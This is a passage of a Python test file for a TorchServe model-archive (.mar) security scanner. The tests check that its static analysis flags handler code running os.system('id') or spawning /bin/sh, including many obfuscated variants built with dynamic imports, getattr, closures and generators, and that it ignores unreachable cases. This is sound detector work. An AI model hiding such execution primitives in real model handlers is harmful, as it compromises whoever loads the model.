            b"    return module.system('id')\n"
            b"\n"
            b"if TYPE_CHECKING:\n"
            b"    module = __import__('os')\n"
        ),
        (
            b"import typing\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    return module.system('id')\n"
            b"\n"
            b"if typing.TYPE_CHECKING:\n"
            b"    module = __import__('os')\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_avoids_non_executing_alias_false_positives(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"from importlib import import_module as load\n"
            b"load: object\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    return load('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    from importlib import import_module as load\n"
            b"    load: object\n"
            b"    return load('os').system('id')\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_preserves_annotation_only_runtime_bindings(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


def test_dynamic_import_handler_analysis_treats_match_captures_as_local_bindings() -> None:
    handler_source = (
        b"from importlib import import_module as load\n"
        b"\n"
        b"def handle(data, context):\n"
        b"    match context:\n"
        b"        case load:\n"
        b"            pass\n"
        b"    return load('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


def test_dynamic_import_handler_analysis_ignores_invalid_ctypes_library_loader_factories() -> None:
    handler_source = (
        b"def handle(data, context):\n"
        b"    ctypes_module = __import__('ctypes')\n"
        b"    loader = ctypes_module.LibraryLoader(len)\n"
        b"    return loader.LoadLibrary('payload.so')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "ctypes.LibraryLoader.<dynamic>" not in risky_calls


def test_dynamic_import_handler_analysis_does_not_leak_class_namespace_aliases_into_methods() -> None:
    handler_source = (
        b"import importlib\n"
        b"\n"
        b"class Handler:\n"
        b"    load = importlib.import_module\n"
        b"\n"
        b"    def handle(self, data, context):\n"
        b"        return load('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


def test_dynamic_import_handler_analysis_preserves_class_body_execution_order() -> None:
    handler_source = (
        b"class Handler:\n    runner = load('os').system('id')\n\nfrom importlib import import_module as load\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"def outer():\n"
            b"    load = __import__\n"
            b"\n"
            b"    def handle(data, context):\n"
            b"        return load('os').system('id')\n"
            b"\n"
            b"    return handle\n"
        ),
        (
            b"def outer():\n"
            b"    load = __import__\n"
            b"\n"
            b"    class Handler:\n"
            b"        def handle(self, data, context):\n"
            b"            return load('os').system('id')\n"
            b"\n"
            b"    return Handler\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_preserves_enclosing_function_closures(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (b"def handle(data, context):\n    return [module.system('id') for module in [__import__('os')]]\n"),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os')]:\n"
            b"        case [module]:\n"
            b"            return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    load = getattr(__import__('importlib'), 'import_module')\n"
            b"    return load('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('os'), __import__('math')]:\n"
            b"        module.system('id')\n"
        ),
        (
            b"def outer():\n"
            b"    def handle(data, context):\n"
            b"        return load('os').system('id')\n"
            b"\n"
            b"    load = __import__\n"
            b"    return handle\n"
        ),
        (
            b"def outer():\n"
            b"    class Handler:\n"
            b"        def handle(self, data, context):\n"
            b"            return load('os').system('id')\n"
            b"\n"
            b"    load = __import__\n"
            b"    return Handler\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_closes_iterable_pattern_and_closure_bypasses(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


def test_dynamic_import_handler_analysis_keeps_comprehension_targets_scoped() -> None:
    handler_source = (
        b"from importlib import import_module as module\n"
        b"\n"
        b"def handle(data, context):\n"
        b"    [value for module in [len] for value in [module]]\n"
        b"    return module('os').system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (b"def handle(data, context, module=__import__('os')):\n    return module.system('id')\n"),
        (
            b"from importlib import import_module as load\n"
            b"def handle(data, context, load=load):\n"
            b"    return load('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    imp = __import__('importlib')\n"
            b"    return imp.import_module('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    return __import__('builtins').__import__('os').system('id')\n"),
        (b"def handle(data, context):\n    return (module := __import__('os')).system('id')\n"),
        (b"def handle(data, context):\n    resolve = getattr\n    return resolve(__import__('os'), 'system')('id')\n"),
        (b"def handle(data, context):\n    [(load := __import__) for _ in [0]]\n    return load('os').system('id')\n"),
        (b"def handle(data, context):\n    return __import__('builtins').getattr(__import__('os'), 'system')('id')\n"),
    ],
)
def test_dynamic_import_handler_analysis_closes_callable_and_walrus_bypasses(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"from importlib import import_module as load\n"
            b"del load\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    return load('os').system('id')\n"
        ),
        (b"from importlib import import_module as load\nfn = lambda load: load('os').system('id')\n"),
    ],
)
def test_dynamic_import_handler_analysis_avoids_deleted_and_lambda_alias_false_positives(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


def test_dynamic_import_handler_analysis_keeps_literal_loop_exit_binding() -> None:
    handler_source = (
        b"def handle(data, context):\n"
        b"    for module in [__import__('os'), __import__('math')]:\n"
        b"        pass\n"
        b"    return module.system('id')\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


def test_dynamic_import_handler_analysis_evaluates_defaults_at_definition_time() -> None:
    handler_source = (
        b"def handle(data, context, module=load('os')):\n"
        b"    return module.system('id')\n"
        b"\n"
        b"from importlib import import_module as load\n"
    )

    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os') if context else __import__('math')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if context:\n"
            b"        from builtins import getattr as resolve\n"
            b"    else:\n"
            b"        resolve = getattr\n"
            b"    return resolve(__import__('os'), 'system')('id')\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_merges_expression_and_helper_aliases(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"def handle(data, context):\n"
            b"    if False:\n"
            b"        module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if True:\n"
            b"        module = __import__('math')\n"
            b"    else:\n"
            b"        module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in []:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (b"def handle(data, context):\n    return [module.system('id') for module in [__import__('os')] if False]\n"),
        (
            b"def handle(data, context):\n"
            b"    while False:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    while True:\n"
            b"        break\n"
            b"    else:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def outer():\n"
            b"    def handle(data, context):\n"
            b"        return load('os').system('id')\n"
            b"    return handle\n"
            b"    load = __import__\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if not True:\n"
            b"        module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (b"def handle(data, context):\n    if False and __import__('os').system('id'):\n        pass\n"),
        (b"def handle(data, context):\n    if True or __import__('os').system('id'):\n        pass\n"),
        (
            b"def handle(data, context):\n"
            b"    for module in '':\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in b'':\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (b"def handle(data, context):\n    return [module.system('id') for module in []]\n"),
        (
            b"def handle(data, context):\n"
            b"    while not True:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if True:\n"
            b"        return None\n"
            b"    module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os') if False else __import__('math')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        raise RuntimeError()\n"
            b"    except RuntimeError:\n"
            b"        pass\n"
            b"    else:\n"
            b"        __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return []\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os')]:\n"
            b"        case [module] if False:\n"
            b"            module.system('id')\n"
        ),
        (
            b"import importlib\n"
            b"def handle(data, context):\n"
            b"    return importlib.import_module(module='os').system('id')\n"
        ),
        (
            b"import importlib\n"
            b"def handle(data, context):\n"
            b"    return importlib.import_module(name='os', bogus=True).system('id')\n"
        ),
        (
            b"import importlib\n"
            b"def handle(data, context):\n"
            b"    return importlib.import_module('os', name='math').system('id')\n"
        ),
        (
            b"TYPE_CHECKING = False\n"
            b"if TYPE_CHECKING:\n"
            b"    module = __import__('os')\n"
            b"def handle(data, context):\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    list = lambda value: []\n"
            b"    return list(generator)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('os'), __import__('math')]:\n"
            b"        if False:\n"
            b"            break\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        return None\n"
            b"    except Exception:\n"
            b"        return __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(generator, 1)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return next(generator, None, None)\n"
        ),
        (b"def handle(data, context):\n    return getattr(object=__import__('os'), name='system')('id')\n"),
        (b"def handle(data, context):\n    return getattr(__import__('os'), 'system', None, None)('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os')\n"
            b"    module += []\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module, *rest, final = [__import__('os')]\n"
            b"    return module.system('id')\n"
        ),
        (b"def handle(data, context):\n    for module in [*[]]:\n        __import__('os').system('id')\n"),
        (b"def handle(data, context):\n    return [__import__('os').system('id') for module in {**{}}]\n"),
        (
            b"def handle(data, context):\n"
            b"    if [*[]]:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (b"def handle(data, context):\n    return __import__('os', level=1).system('id')\n"),
        (b"def handle(data, context):\n    with __import__('os') as module:\n        return module.system('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os') and __import__('math')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for value in [0]:\n"
            b"        break\n"
            b"    else:\n"
            b"        __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os')]:\n"
            b"        case _:\n"
            b"            pass\n"
            b"        case [module]:\n"
            b"            module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        pass\n"
            b"    except Exception:\n"
            b"        __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for value in [0]:\n"
            b"        return None\n"
            b"    __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os')\n"
            b"    if context:\n"
            b"        module = __import__('math')\n"
            b"    else:\n"
            b"        return []\n"
            b"    return module.system('id')\n"
        ),
        (b"def handle(data, context):\n    while True:\n        return []\n    __import__('os').system('id')\n"),
        (
            b"class Handler:\n"
            b"    def unused(self):\n"
            b"        self.module = __import__('os')\n"
            b"\n"
            b"    def handle(self, data, context):\n"
            b"        return self.module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os'), 0]:\n"
            b"        case [module, 1]:\n"
            b"            module.system('id')\n"
        ),
        (b"from .builtins import __import__ as load\ndef handle(data, context):\n    return load('os').system('id')\n"),
        (b"def handle(data, context):\n    runner = lambda: __import__('os').system('id')\n    return []\n"),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('math'), __import__('os')])\n"
            b"    return next(generator)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    holder.module = __import__('os')\n"
            b"    holder = None\n"
            b"    return holder.module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        return []\n"
            b"    finally:\n"
            b"        module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        pass\n"
            b"    except Exception:\n"
            b"        return []\n"
            b"    else:\n"
            b"        return []\n"
            b"    return __import__('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    return any(call() for call in [lambda: True, __import__('os').system])\n"),
        (b"def handle(data, context):\n    return all(call() for call in [lambda: False, __import__('os').system])\n"),
        (b"def handle(data, context):\n    return (lambda module: module.system('id'))()\n"),
        (b"def handle(data, context):\n    return [__import__('os').system][1]('id')\n"),
        (
            b"class Handler:\n"
            b"    module = __import__('os')\n"
            b"\n"
            b"    @staticmethod\n"
            b"    def handle(data, context):\n"
            b"        return self.module.system('id')\n"
        ),
        (
            b"class Handler:\n"
            b"    module = __import__('os')\n"
            b"    module = __import__('math')\n"
            b"\n"
            b"    def handle(self, data, context):\n"
            b"        return self.module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    vars = lambda value: {'system': lambda command: None}\n"
            b"    return vars(__import__('os'))['system']('id')\n"
        ),
        (
            b"import contextlib\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    with contextlib.nullcontext():\n"
            b"        return []\n"
            b"        __import__('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    return __import__('os').__getattribute__('system', None)('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(*(generator, generator))\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    holder.gen = (module.system('id') for module in [__import__('os')])\n"
            b"    holder = None\n"
            b"    return list(holder.gen)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('math'), __import__('os')]:\n"
            b"        return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os')\n"
            b"    match [__import__('math')]:\n"
            b"        case [module]:\n"
            b"            pass\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    while True:\n"
            b"        module = __import__('os')\n"
            b"        continue\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    runner = lambda module=__import__('os'): module.system('id')\n"
            b"    return runner(__import__('math'))\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_ignores_statically_unreachable_aliases(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" not in risky_calls


@pytest.mark.parametrize(
    "handler_source",
    [
        (
            b"def handle(data, context):\n"
            b"    if True:\n"
            b"        module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (b"def handle(data, context):\n    for module in [__import__('os')]:\n        module.system('id')\n"),
        (b"def handle(data, context):\n    return [module.system('id') for module in [__import__('os')] if True]\n"),
        (
            b"def handle(data, context):\n"
            b"    while True:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
            b"        break\n"
        ),
        (
            b"def outer():\n"
            b"    load = __import__\n"
            b"    def handle(data, context):\n"
            b"        return load('os').system('id')\n"
            b"    return handle\n"
        ),
        (b"def handle(data, context):\n    if True and __import__('os').system('id'):\n        pass\n"),
        (b"def handle(data, context):\n    if False or __import__('os').system('id'):\n        pass\n"),
        (
            b"def handle(data, context):\n"
            b"    for module in []:\n"
            b"        pass\n"
            b"    else:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    while False:\n"
            b"        pass\n"
            b"    else:\n"
            b"        module = __import__('os')\n"
            b"        module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if False:\n"
            b"        return None\n"
            b"    module = __import__('os')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os') if True else __import__('math')\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        pass\n"
            b"    except RuntimeError:\n"
            b"        pass\n"
            b"    else:\n"
            b"        __import__('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    return list(module.system('id') for module in [__import__('os')])\n"),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(generator)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    if context:\n"
            b"        generator = (module.system('id') for module in [__import__('os')])\n"
            b"    else:\n"
            b"        generator = (value for value in [1])\n"
            b"    alias = generator\n"
            b"    return next(alias)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('os'), __import__('math')]:\n"
            b"        break\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os')]:\n"
            b"        case [module] if True:\n"
            b"            module.system('id')\n"
        ),
        (b"def handle(data, context):\n    for module in {__import__('os'): 1}:\n        module.system('id')\n"),
        (b"import importlib\ndef handle(data, context):\n    return importlib.import_module(name='os').system('id')\n"),
        (
            b"TYPE_CHECKING = True\n"
            b"if TYPE_CHECKING:\n"
            b"    module = __import__('os')\n"
            b"def handle(data, context):\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    consume = list\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return consume(generator)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        raise RuntimeError()\n"
            b"    except RuntimeError:\n"
            b"        return __import__('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    for module in [*[__import__('os')]]:\n        module.system('id')\n"),
        (b"def handle(data, context):\n    for module in {**{__import__('os'): 1}}:\n        module.system('id')\n"),
        (b"def handle(data, context):\n    module, *rest = [__import__('os'), 1, 2]\n    return module.system('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    first, *rest, module = [1, 2, __import__('os')]\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    (module := __import__('os')) if context else (module := __import__('math'))\n"
            b"    return module.system('id')\n"
        ),
        (b"def handle(data, context):\n    module = context and __import__('os')\n    return module.system('id')\n"),
        (b"def handle(data, context):\n    return __import__(*['os']).system('id')\n"),
        (b"import importlib\ndef handle(data, context):\n    return importlib.import_module(*['os']).system('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    (context and (module := __import__('os'))) or (module := __import__('math'))\n"
            b"    return module.system('id')\n"
        ),
        (
            b"class Handler:\n"
            b"    def handle(self, data, context):\n"
            b"        return self.module.system('id')\n"
            b"\n"
            b"    def __init__(self):\n"
            b"        self.module = __import__('os')\n"
        ),
        (
            b"import importlib\n"
            b"def handle(data, context):\n"
            b"    return importlib.import_module(**{'name': 'os'}).system('id')\n"
        ),
        (b"def handle(data, context):\n    return __import__(**{'name': 'os'}).system('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    consume = list if context else tuple\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return consume(generator)\n"
        ),
        (b"def handle(data, context):\n    return getattr(*[__import__('os'), 'system'])('id')\n"),
        (b"def handle(data, context):\n    return __import__('os').__dict__['system']('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    match [__import__('os'), 1]:\n"
            b"        case [module, *rest]:\n"
            b"            module.system('id')\n"
        ),
        (b"def handle(data, context):\n    runner = lambda: __import__('os').system('id')\n    return runner()\n"),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        {**1}\n"
            b"    except Exception:\n"
            b"        return __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    try:\n"
            b"        might_fail()\n"
            b"    except Exception:\n"
            b"        pass\n"
            b"    else:\n"
            b"        return []\n"
            b"    return __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(zip(generator))\n"
        ),
        (b"def handle(data, context):\n    return any(call() for call in [lambda: False, __import__('os').system])\n"),
        (b"def handle(data, context):\n    return all(call() for call in [lambda: True, __import__('os').system])\n"),
        (b"def handle(data, context):\n    return (load := __import__)('os').system('id')\n"),
        (b"def handle(data, context):\n    return (lambda module: module.system('id'))(__import__('os'))\n"),
        (b"def handle(data, context):\n    return __import__(f'os').system('id')\n"),
        (b"def handle(data, context):\n    return [__import__('os').system][0]('id')\n"),
        (
            b"class Handler:\n"
            b"    def handle(self, data, context):\n"
            b"        return self.module.system('id')\n"
            b"\n"
            b"    module = __import__('os')\n"
        ),
        (b"class Handler(object, marker=__import__('os').system('id')):\n    pass\n"),
        (b"def handle(data, context):\n    return vars(__import__('os'))['system']('id')\n"),
        (
            b"import importlib\n"
            b"\n"
            b"def handle(data, context):\n"
            b"    return getattr(importlib, 'import_module')('os').system('id')\n"
        ),
        (b"def handle(data, context):\n    return __import__('os').__getattribute__('system')('id')\n"),
        (
            b"def handle(data, context):\n"
            b"    generator = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(*(generator,))\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    holder.gen = (module.system('id') for module in [__import__('os')])\n"
            b"    return list(holder.gen)\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    for module in [__import__('os'), __import__('math')]:\n"
            b"        return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    module = __import__('os')\n"
            b"    match context:\n"
            b"        case [module]:\n"
            b"            pass\n"
            b"    return module.system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    while True:\n"
            b"        if context:\n"
            b"            break\n"
            b"        continue\n"
            b"    return __import__('os').system('id')\n"
        ),
        (
            b"def handle(data, context):\n"
            b"    runner = lambda module=__import__('os'): module.system('id')\n"
            b"    return runner()\n"
        ),
    ],
)
def test_dynamic_import_handler_analysis_preserves_reachable_aliases(
    handler_source: bytes,
) -> None:
    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)

    assert parse_error is None
    assert "os.system" in risky_calls


@pytest.mark.parametrize(
    ("handler_source", "dangerous_name"),
    [
        (b"import os\ndef handle(data, context):\n    return os.execvpe('/bin/sh', ['sh'], {})\n", "os.execvpe"),
        (
            b"from os import spawnv as run\ndef handle(data, context):\n"
            b"    return run(0, '/bin/sh', ['sh', '-c', 'id'])\n",
            "os.spawnv",
        ),
        (
            b"import os\ndef handle(data, context):\n    return os.posix_spawn('/bin/sh', ['sh', '-c', 'id'], {})\n",
            "os.posix_spawn",
        ),
        (
            b"import os\ndef handle(data, context):\n"
            b"    return getattr(os, 'posix_' + 'spawn')('/bin/sh', ['sh'], {})\n",
            "os.posix_spawn",
        ),
        (b"import os\ndef handle(data, context):\n    return os.startfile('payload.exe')\n", "os.startfile"),
        (
            b"import os\ndef handle(data, context):\n    os.posix_spawn = len\n    return os.posix_spawn([])\n",
            "os.posix_spawn",
        ),
        (
            b"import asyncio\nasync def handle(data, context):\n"
            b"    return await asyncio.create_subprocess_shell('id')\n",
            "asyncio.create_subprocess_shell",
        ),
        (
            b"from asyncio import create_subprocess_exec as launch\nasync def handle(data, context):\n"
            b"    return await launch('id')\n",
            "asyncio.create_subprocess_exec",
        ),
        (
            b"import runpy\ndef handle(data, context):\n    return runpy._run_module_as_main('payload')\n",
            "runpy._run_module_as_main",
        ),
        (b"import runpy\ndef handle(data, context):\n    return runpy.run_module('payload')\n", "runpy.run_module"),
        (
            b"from runpy import run_path as run\ndef handle(data, context):\n    return run('payload.py')\n",
            "runpy.run_path",
        ),
    ],
)
def test_scan_detects_handler_execution_primitive(tmp_path: Path, handler_source: bytes, dangerous_name: str) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_source, "weights.bin": b"weights"},
        filename="os_process_launch_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert dangerous_name in handler_failures[0].message


def test_scan_allows_replaced_runpy_handler_api(tmp_path: Path) -> None:
    handler_source = (
        b"import runpy\ndef handle(data, context):\n    runpy.run_path = len\n    return runpy.run_path([])\n"
    )
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={"handler.py": handler_source, "weights.bin": b"weights"},
        filename="safe_replaced_runpy_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))

    assert _failed_checks(result, "TorchServe Handler Static Analysis") == []


def test_scan_detects_dunder_call_getattr_wrapped_handler_execution_primitive(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": (
                b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system').__call__('id')\n"
            ),
            "weights.bin": b"weights",
        },
        filename="dunder_call_getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert len(handler_failures) == 1
    assert handler_failures[0].severity == IssueSeverity.CRITICAL
    assert "os.system" in handler_failures[0].message


def test_scan_allows_benign_getattr_handler_access(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": (
                b"class Handler:\n"
                b"    def __init__(self):\n"
                b"        self._value = {'ok': True}\n"
                b"\n"
                b"    def handle(self, data, context):\n"
                b"        return getattr(object=self, name='_value')\n"
            ),
            "weights.bin": b"weights",
        },
        filename="benign_getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert handler_failures == []


def test_scan_allows_benign_dunder_call_getattr_handler_access(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
            "handler.py": (
                b"class Handler:\n"
                b"    def _safe_value(self):\n"
                b"        return {'ok': True}\n"
                b"\n"
                b"    def handle(self, data, context):\n"
                b"        return getattr(self, '_safe_value').__call__()\n"
            ),
            "weights.bin": b"weights",
        },
        filename="benign_dunder_call_getattr_handler.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert handler_failures == []


def test_scan_accepts_clean_duplicate_handler_members(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries=[
            ("handler.py", b"def handle(data, context):\n    return {'ok': True}\n"),
            ("handler.py", b"def handle(data, context):\n    return {'still_ok': True}\n"),
            ("weights.bin", b"weights"),
        ],
        filename="duplicate_handler_clean.mar",
    )

    result = TorchServeMarScanner().scan(str(mar_path))
    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")

    assert handler_failures == []


def test_non_handler_python_analysis_clean_handler_and_utils_has_no_failures(tmp_path: Path) -> None:
    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
    mar_path = _create_mar_archive(
        tmp_path,
        manifest=manifest,
        entries={
